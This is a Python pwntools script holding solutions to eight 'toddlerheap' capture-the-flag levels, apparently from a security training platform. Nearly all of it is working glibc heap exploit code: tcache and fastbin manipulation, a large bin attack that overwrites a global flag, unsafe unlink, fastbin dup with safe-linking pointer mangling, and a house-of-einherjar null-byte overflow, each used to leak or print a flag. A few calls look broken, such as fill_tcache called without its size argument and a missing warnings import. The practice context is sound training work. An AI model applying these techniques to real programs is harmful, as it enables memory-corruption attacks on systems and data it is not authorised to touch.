from pwn import *
import os
import time
import re
import sys

CHALLENGE_NAME = f"/challenge/toddlerheap_level{os.getenv('HOSTNAME')[-3:-2]}.{os.getenv('HOSTNAME')[-1:]}"
libc = ELF(f"/challenge/lib/libc.so.6")
binary = ELF(CHALLENGE_NAME)

def demangle(ptr, pg_off=0):
    middle = ptr ^ ((ptr >> 12)+pg_off)
    return (middle ^ (middle >> 24))

def mangle(pos, ptr):
    return ((pos >> 12) ^ ptr)

def fill_tcache(p, size):
    for i in range(8):
        p.sendline(f'malloc {i} {size}'.encode())
        # print(p.clean().decode())
    for i in range(8):
        p.sendline(f'free {i}'.encode())
        # print(p.clean().decode())

# need to consolidate to get the flag allocation
# 1. fill the tcache
# 2. next malloc will go to the heap heap
# 3. now if you read the flag it will be the last allocation from step 2
def challenge1():
    p = process([CHALLENGE_NAME], close_fds=False)
    input(f'PID {p.pid}')
    fill_tcache(p)
    p.sendline(b"read_flag puts 7")
    info(p.clean())
    p.kill()

# same as above challenge but read_flag mallocs 2 times
def challenge2():
    p = process([CHALLENGE_NAME], close_fds=False)
    input(f'PID {p.pid}')
    # fill up the 0x80 tcache and add 9 entries to the 0x80 fastbins
    for i in range(16):
        p.sendline(f'malloc {i} 120'.encode())
        p.clean()
    for i in range(16):
        p.sendline(f'free {i}'.encode())
    for i in range(16):
        p.sendline(f'malloc {i} 100'.encode())
        p.clean()
    # fill up the tcache for 0x70 with the values from the bottom of the heap
    # then fill up the fastbins with the ones in the middle of the heap 
    # this is so that there is 0x600 bytes of fastbins space to consolidate for
    # the first time the flag is allocated
    for i in range(14, -1, -1):
        p.sendline(f'free {i}'.encode())
    # free the last entry in the heap and it should go to the fastbins
    # allocate the flag, the first time should go to the middle of the heap
    # the second time should go to the end of the heap at alloc 15
    p.sendline(f'free 15 read_flag puts 15')
    info(p.clean())
    p.kill()

# same as level 2 but there is a minimum amount you need to malloc now not a max
def challenge3():
    p = process([CHALLENGE_NAME], close_fds=False)
    input(f'PID {p.pid}')
    # malloc a large chunk so that the final read of the flag is the second alloc
    p.sendline(b'malloc 0 9740 malloc 1 2000 free 0 free 1 read_flag puts 1')
    info(p.clean())
    p.kill()

# large_bin_attack.c
# need to set an authenticated value to not be null for send_flag
def challenge4():
    authenticated = 0x4041C0
    p = process([CHALLENGE_NAME], close_fds=False)
    input(f'PID {p.pid}')
    # set up the heap from large_bin_attack.c
    p.sendline(
    '''malloc 0 5032 malloc 1 3000 
    malloc 2 5000 malloc 3 3000 
    free 0
    malloc 4 6000
    free 2
    '''.encode())
    info(p.clean())
    # leak the fd pointer of alloc 0
    p.sendline(b'puts 0')
    p.readuntil(b'Data: ')
    leak = int.from_bytes(p.readline().strip(), 'little')
    print(hex(leak))
    # create fake heap metadata
    # set the fd_size and bk_size ptrs to be 0x20 before authenticated
    p.sendline(b'safe_read 0')
    p.send(p64(leak)*2 + p64(authenticated-0x20)*2)
    # when you malloc here the metadata of alloc[2] will be updated
    # this will cause a value to be written to authenticated so you can send_flag
    p.sendline(b'malloc 5 6000 send_flag')
    info(p.clean())
    p.kill()

# unsafe_unlink.c
# flag is read onto the heap and you are given the address
def challenge5():
    p = process([CHALLENGE_NAME], close_fds=False)
    input(f'PID {p.pid}')
    # get the addresses of flag, chunk0, and chunk1
    p.readuntil(b'Reading the flag into ')
    flag = int(p.readline().strip().decode()[:-1], 16)
    print(f'FLAG AT: {hex(flag)}')
    chunk0 = 0x404140
    chunk1 = flag + 2192
    print(f'CHUNK0 AT: {hex(chunk0)}')
    print(f'CHUNK1 AT: {hex(chunk1)}')
    # set up the attack
    p.sendline(b'malloc 0 1056 malloc 1 1056 read 0 3000')
    payload = p64(0x00) + p64(0x431-0x10) + p64(chunk0-24) + p64(chunk0-16) + p64(0x00)*128 + p64(0x420) + p64(0x430)
    p.send(payload)
    # free chunk0 then set chunk0[3] to be the address of the flag
    p.sendline(b'free 1 read 0 1056')
    p.send(p64(0x00) + p64(0x00) + p64(0x404128) + p64(flag))
    p.sendline(b'puts 0')
    info(p.clean())
    p.kill()

# fastbin_dup_into_stack.c
# reads the flag into the bss then tells you where (has pie)
# allows for calloc, reading into the bss, and reading into allocations
def challenge6():
    p = process([CHALLENGE_NAME], close_fds=False)
    # get the address of the flag
    p.readuntil(b'flag into ')
    flag = int(p.readline().strip().decode()[:-1], 16) - 0x28
    # get a heap leak
    p.sendline(f'calloc 0 24 free 0 puts 0')
    p.readuntil(b'Data: ')
    leak = int.from_bytes(p.readlineb().strip(), 'little')
    # fill tcache
    for i in range(7):
        p.sendline(f'calloc {i} 24')
    for i in range(7):
        p.sendline(f'free {i}')
    # alloc 3 buffers
    p.sendline(b'calloc 7 24 calloc 8 24 calloc 9 24')
    # free the first one then the second one then the first one again
    p.sendline(b'free 7 free 8 free 7')
    # alloc 2 more times (d = 10)
    p.sendline(b'calloc 10 24 calloc 11 24')
    # read 0x20 right before the flag
    p.sendline(b'read_to_global 800')
    p.send(p64(0x20)*88 + p64(0x20))
    # read the location of the flag into the fastbins
    d = (leak) ^ flag
    p.sendline(b'safer_read 6')
    p.send(p64(d))
    # calloc the location of the flag into alloc[13]
    p.sendline(b'calloc 12 24 calloc 13 24') 
    # read 24 'a's so we can print the flag
    p.sendline(b'safer_read 13')
    p.send(b'a'*24)
    p.sendline(b'puts 13')
    info(p.clean())
    print(f'flag {hex(flag)}')
    input(f'PID {p.pid}')
    p.interactive()
    p.kill()

# same as level 6 but there is no global read
# exploit the fact that the sizes of the mallocs are stored right before the flag
def challenge7():
    p = process([CHALLENGE_NAME], close_fds=False)
    # get the address of the flag
    p.readuntil(b'flag into ')
    flag = int(p.readline().strip().decode()[:-1], 16) - 0x38
    # get a heap leak
    p.sendline(f'calloc 0 32 free 0 puts 0')
    p.readuntil(b'Data: ')
    leak = int.from_bytes(p.readlineb().strip(), 'little')
    # fill tcache
    for i in range(7):
        p.sendline(f'calloc {i} 32')
    for i in range(7):
        p.sendline(f'free {i}')
    # alloc 3 buffers
    p.sendline(b'calloc 7 32 calloc 8 32 calloc 9 32')
    # free the first one then the second one then the first one again
    p.sendline(b'free 7 free 8 free 7')
    # alloc 2 more times (d = 6)
    p.sendline(b'calloc 10 32 calloc 11 32')
    # read the location of the flag into the fastbins
    d = (leak) ^ flag
    p.sendline(b'safer_read 6')
    p.send(p64(d))
    # calloc the location of the flag into alloc[13]
    # and set the size to be 0x30 (48) using alloc[6] and alloc[7]
    p.sendline(b'calloc 6 48 calloc 14 32 calloc 7 0 calloc 13 32')
    # read 24 'a's to overwrite the size of alloc 13
    # read 40 'a's to print the flag
    p.sendline(b'safer_read 13')
    p.send(b'a'*24)
    p.sendline(b'safer_read 13')
    p.send(b'a'*40)
    p.sendline(b'puts 13')
    print(f'flag {hex(flag)}')
    input(f'PID {p.pid}')
    info(p.clean())
    p.kill()

# house_of_einherjar.c
# allows for you to read, malloc, and free to allocations
# reads the flag onto the stack
# requires a heap leak at the beginning
def challenge8():
    p = process([CHALLENGE_NAME], close_fds=False)
    # get heap leak
    p.sendline(b'malloc 0 16 malloc 1 16 free 0 free 1 malloc 0 16')
    info(p.clean()) 
    p.sendline(b'puts 0')
    p.readuntil(b'Data: ')
    heap_leak = demangle(int.from_bytes(p.readlineb().strip(), 'little'))  
    # a
    p.sendline(b'malloc 0 56')  
    a0 = 0 # prev_size (Not Used)
    a1 = 0x60 # size 
    a2 = heap_leak + 64 # fwd
    a3 = heap_leak + 64 # bck
    p.sendline(b'read_copy 0')
    p.send(p64(a0) + p64(a1) + p64(a2) + p64(a3))
    # b
    p.sendline(b'malloc 1 40')
    read_b_size = 0x28
    # c
    p.sendline(b'malloc 2 248')
    c_size_ptr = 0x101
    # We overflow 'b' with a single null byte into the metadata of 'c'
    p.sendline(b'read_copy 1')
    p.send(b'\x00'*40)
    # 
    fake_size = 0x60
    p.sendline(b'read_copy 1')
    p.send(b'\x00'*32 + b'\x60')
    # fill tcache
    for i in range(7):
        p.sendline(f'malloc {i+3} 248'.encode())

    for i in range(7):
        p.sendline(f'free {i+3}'.encode())
    # free c
    p.sendline(b'free 2')
    # d
    p.sendline(b'malloc 10 344')
    # malloc and free 'pad'
    p.sendline(b'malloc 11 40 free 11')
    # free b
    p.sendline(b'free 1')
    # We overwrite b's fwd pointer using chunk 'd'
    target = heap_leak + 2272
    d = target ^ (heap_leak >> 12)
    p.sendline(b'read_copy 10')
    p.send(p64(heap_leak >> 12) + p64(0x00) + p64(0x00) + p64(0x00) + p64(0x00) + p64(0x31) + p64(d))
    # now the exploit is set up
    p.sendline(b'malloc 12 40 malloc 12 40')
    # 12 points to the flag
    p.sendline(b'read_flag puts 12') 
    info(p.clean())
    input(f'PID {p.pid}')
    print(f'heap leak {hex(heap_leak)}')
    p.interactive()
    p.kill()

def main():
    context.arch = 'amd64'
    context.encoding ='latin'
    context.log_level = 'INFO'
    context.terminal = ["tmux", "splitw", "-h"]
    warnings.simplefilter('ignore')
    challenge8()

def challengeT():
    p = process([CHALLENGE_NAME], close_fds=False)
    input(f'PID {p.pid}')
    info(p.clean())
    p.interactive()
    p.kill()

if __name__ == "__main__":
    main()


    

# with gdb.debug([CHALLENGE_NAME], '''
    # disp/5i $rip
    # disp/40gx $rsp
    # b *main+693
    # b *main+432
    # ''') as p:
    

# core = Coredump('./core')
# print(core)


    